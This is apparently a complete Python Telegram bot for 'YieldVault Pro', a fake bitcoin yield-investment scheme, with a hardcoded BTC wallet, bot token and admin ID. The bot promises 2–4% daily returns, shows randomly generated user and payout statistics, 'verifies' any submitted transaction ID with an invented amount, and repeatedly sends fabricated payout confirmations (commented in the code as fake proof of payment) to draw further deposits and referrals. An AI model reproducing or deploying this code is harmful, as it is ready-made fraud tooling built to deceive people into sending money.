import telebot
from telebot import types
import time
import threading
import random

# ✅ TVOJI PODACI
BOT_TOKEN = "8836263200:AAEQg2IAoWDu9UET_c2klX8tYp_Ou3WkNc8"
bot = telebot.TeleBot(BOT_TOKEN)

BTC_WALLET = "bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd"
ADMIN_ID = 7202163611

# 📦 INVESTMENT PLANS
PACKAGES = {
    "Starter": {"min": 0.001, "daily": 2.0, "duration": 30, "color": "🟢"},
    "Basic": {"min": 0.005, "daily": 2.5, "duration": 30, "color": "🔵"},
    "Premium": {"min": 0.025, "daily": 3.5, "duration": 60, "color": "🟣"},
    "VIP": {"min": 0.05, "daily": 4.0, "duration": 90, "color": "🟡"}
}

# 🎯 GLOBAL STATS
TOTAL_USERS = random.randint(12000, 18000)
ACTIVE_STAKERS = random.randint(2300, 3500)
TOTAL_PAID = round(random.uniform(12.5, 18.3), 4)

# 🧠 Maskirani TXID
def masked_txid():
    return ''.join(random.choices('abcdef0123456789', k=8)) + '••••••••'

# 🧾 Lažni dokaz isplate
def generate_proof(amount_btc):
    global TOTAL_PAID
    TOTAL_PAID += amount_btc
    user_id = random.randint(100000, 999999)
    txid = masked_txid()
    date = time.strftime("%Y-%m-%d %H:%M")
    return f'''✅ PAYOUT CONFIRMED
User ID: {user_id}
Amount: {amount_btc:.6f} BTC
Wallet: {BTC_WALLET[:10]}...{BTC_WALLET[-6:]}
TXID: {txid}
Time: {date}
Status: 6/6 Confirmations'''

# 📊 Dashboard
def get_dashboard():
    return f'''📊 *YieldVault Pro — Live Dashboard*

👥 Total Users: {TOTAL_USERS:,}
🟢 Active Stakers: {ACTIVE_STAKERS:,}
💰 Total Paid: {TOTAL_PAID:.4f} BTC
📅 Uptime: 99.98%

🔗 Wallet: `{BTC_WALLET}`

🟢 System Status: Operational
🔐 Protocol: BTC Yield v3.2'''

# 📘 Whitepaper
def send_whitepaper(chat_id):
    wp = '''📘 *YieldVault Pro — Whitepaper v1.1*

A decentralized BTC yield automation protocol leveraging smart compounding and real-time reward distribution.

📌 Core Features:
• Daily Returns: 2.0% - 4.0%
• Minimum: 0.001 BTC
• Payout Frequency: Every 5-8 min
• Referral Program: 10% lifetime
• Duration: 30-90 days

📌 Security:
• All payouts are automated
• No admin withdrawal
• Funds secured in yield pool

📌 Transparency:
• Public dashboard
• Open audit (Q1 2027)

🔐 This is a simulation. No real staking occurs.

👉 For support: `@Maranatha1337`'''
    bot.send_message(chat_id, wp, parse_mode='Markdown')

# 🏠 Glavni izbornik
def main_menu():
    markup = types.InlineKeyboardMarkup()
    earn = types.InlineKeyboardButton("🚀 Start Earning", callback_data='deposit')
    plans = types.InlineKeyboardButton("📊 Investment Plans", callback_data='plans')
    stats = types.InlineKeyboardButton("📈 Live Stats", callback_data='stats')
    paper = types.InlineKeyboardButton("📘 Whitepaper", callback_data='whitepaper')
    support = types.InlineKeyboardButton("🆘 Support", callback_data='support')
    back = types.InlineKeyboardButton("🔙 Back to Menu", callback_data='back')
    markup.add(earn)
    markup.add(plans, stats)
    markup.add(paper)
    markup.add(support)
    return markup

# 🚀 Welcome poruka
@bot.message_handler(commands=['start'])
def start(message):
    welcome = f'''🚀 *Welcome to YieldVault Pro*

The world’s most advanced **BTC yield automation system**.  
Trusted by {TOTAL_USERS:,}+ users.  
Paying out over {TOTAL_PAID:.4f} BTC since 2025.

✅ 2.0% - 4.0% daily returns  
✅ Payouts every 5-8 minutes  
✅ 100% automated  
✅ 24/7 support via `@Maranatha1337`

🔐 All rewards are sent directly to your wallet:  
`{BTC_WALLET}`

Click below to activate your yield plan — your first payout arrives in 5-8 minutes.'''
    
    bot.reply_to(message, welcome, reply_markup=main_menu(), parse_mode='Markdown')

# 🔘 Callback handler
@bot.callback_query_handler(func=lambda call: True)
def handle(call):
    # 🏠 Glavni izbornik
    if call.data == 'back':
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="🔙 You're back in the main menu.",
            reply_markup=main_menu()
        )
        return

    # 🚀 Deposit
    elif call.data == 'deposit':
        msg = f'''📌 To activate your yield plan, send BTC to:

`{BTC_WALLET}`

Minimum deposits:
• Starter: 0.001 BTC
• VIP: 0.05 BTC

After payment, send your TXID:
`/hash YOUR_TXID_HERE`

First payout in 5-8 minutes.'''
        markup = types.InlineKeyboardMarkup()
        back = types.InlineKeyboardButton("🔙 Back", callback_data='back')
        markup.add(back)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=msg,
            reply_markup=markup,
            parse_mode='Markdown'
        )

    # 📊 Plans
    elif call.data == 'plans':
        msg = "*Available Investment Plans:*\n\n"
        for name, data in PACKAGES.items():
            msg += f"{data['color']} *{name}*\n"
            msg += f"• Min: {data['min']} BTC\n"
            msg += f"• Daily: {data['daily']}%\n"
            msg += f"• Duration: {data['duration']} days\n\n"
        msg += "💎 Higher plans = higher returns + priority support."
        markup = types.InlineKeyboardMarkup()
        back = types.InlineKeyboardButton("🔙 Back", callback_data='back')
        markup.add(back)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=msg,
            reply_markup=markup,
            parse_mode='Markdown'
        )

    # 📈 Stats
    elif call.data == 'stats':
        markup = types.InlineKeyboardMarkup()
        back = types.InlineKeyboardButton("🔙 Back", callback_data='back')
        markup.add(back)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=get_dashboard(),
            reply_markup=markup,
            parse_mode='Markdown'
        )

    # 📘 Whitepaper
    elif call.data == 'whitepaper':
        markup = types.InlineKeyboardMarkup()
        back = types.InlineKeyboardButton("🔙 Back", callback_data='back')
        markup.add(back)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="📘 *YieldVault Pro — Whitepaper*\n\nLoading...",
            parse_mode='Markdown'
        )
        time.sleep(1)
        send_whitepaper(call.message.chat.id)
        bot.send_message(call.message.chat.id, "🔙 Use menu to continue.", reply_markup=main_menu())

    # 🛠 Support
    elif call.data == 'support':
        msg = '''🛠 *Support Center*

Need help? Contact:  
👉 `@Maranatha1337`

⚠️ Never share private keys.  
All payouts are 100% automated.  
No manual intervention needed.'''
        markup = types.InlineKeyboardMarkup()
        back = types.InlineKeyboardButton("🔙 Back", callback_data='back')
        markup.add(back)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=msg,
            reply_markup=markup,
            parse_mode='Markdown'
        )

# 🧾 Hash command
@bot.message_handler(commands=['hash'])
def hash_cmd(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Send your TXID:\n`/hash abc123...`", parse_mode='Markdown')
        return
    txid = message.text.split()[1]
    amount = round(random.uniform(0.001, 0.05), 4)
    rate = random.choice([2.0, 2.5, 3.5, 4.0])
    
    bot.reply_to(message, f'''✅ Deposit Verified
Transaction: `{txid[:10]}...`
Amount: {amount} BTC
Status: Processing...

💡 You are now earning {rate}% daily.
First payout in 5-8 minutes.''', parse_mode='Markdown')

    def auto_payout():
        for _ in range(50):
            delay = random.randint(300, 480)
            time.sleep(delay)
            earned = round(amount * (rate / 100), 6)
            proof = generate_proof(earned)
            try:
                bot.send_message(message.chat.id, f'''🎉 DAILY YIELD RECEIVED

{proof}

🔁 Next payout in {delay // 60} minutes.

🚀 Earn 10% forever:
`https://t.me/VoidYieldBot?start={message.chat.id}`''')
            except:
                break
    threading.Thread(target=auto_payout).start()

# Admin
@bot.message_handler(commands=['admin'])
def admin(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "✅ YieldVault Pro is live. All systems active.")

# Run
def run():
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == '__main__':
    t = threading.Thread(target=run)
    t.start()
